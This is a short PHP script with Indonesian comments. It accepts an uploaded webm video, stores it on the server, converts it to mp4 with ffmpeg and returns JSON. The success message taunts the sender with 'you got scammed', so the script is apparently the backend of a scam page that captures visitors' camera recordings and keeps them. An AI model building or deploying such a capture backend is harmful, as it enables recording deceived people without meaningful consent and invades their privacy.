<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($_FILES['video']['error'] === UPLOAD_ERR_OK) {
        $webmInputFile = $_FILES['video']['tmp_name'];

        // Pindahkan file rekaman.webm ke folder "hasil" dengan nama yang sama
        $destinationFile = '../hasil/rekaman.webm'; 
        if (move_uploaded_file($webmInputFile, $destinationFile)) {
            // Buat nama file acak dengan prefix 'output_' dan ekstensi '.mp4'
            $randomFileName = 'output_' . uniqid() . '.mp4';
            $mp4OutputFile = '../hasil/' . $randomFileName;

            $ffmpegCommand = "ffmpeg -i $destinationFile -c:v libx264 -c:a copy $mp4OutputFile "; //2>&1

            // Jalankan perintah ffmpeg melalui terminal
            exec($ffmpegCommand, $output, $returnCode);

            if ($returnCode === 0) {
                echo json_encode(['message' => 'Ahaha Kena Scam Lu cuk 📸👹', 'outputFile' => $randomFileName]);
                // Hapus file rekaman.webm setelah proses konversi berhasil
                unlink($destinationFile);
            } else {
                echo json_encode(['message' => 'Gagal mengkonversi video.']);
            }
        } else {
            echo json_encode(['message' => 'Gagal menyimpan video.']);
        }
    } else {
        echo json_encode(['message' => 'Gagal, Cobalagi/Refresh Ulang']);
    }
}
?>
